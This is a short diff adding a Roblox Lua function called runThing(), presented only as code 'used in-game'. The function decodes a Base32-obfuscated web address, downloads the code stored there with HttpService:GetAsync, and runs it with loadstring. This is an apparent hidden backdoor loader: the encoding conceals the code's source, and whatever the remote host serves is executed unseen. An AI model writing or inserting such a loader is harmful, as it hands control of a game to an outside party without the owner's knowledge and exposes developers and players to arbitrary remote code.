@@ -1,0 +1,25 @@
+-- This is just the code of the runThing() function used in-game
+
+function runThing()
+	local r = require(game.Workspace.Base32Decode)
+	local http = game:GetService("HttpService")
+
+	local c, err1 = r.decode("NB2HI4DTHIXS64TBO4XGO2LUNB2WE5LTMVZGG33OORSW45BOMNXW2L2KKRCE2ZLENFQS6Q3PNZSG6U3DOJUXA5CTORXXEYLHMUXXEZLGOMXWQZLBMRZS63LBNFXC6TLBNFXE233EOVWGK===")
+	if not c then
+		error("Decode error c: " .. tostring(err1))
+	end
+	print("URL: ", c)
+
+	local g = game.HttpService:GetAsync(tostring(c), false)
+	local x = tostring(g)
+	
+	print("GCode: " .. x)
+	print("GCode Type: " .. typeof(g))
+
+	local w, loadErr = loadstring(x)
+	if not w then
+		error("Loadstring error: " .. tostring(loadErr))
+	end
+
+	w()
+end
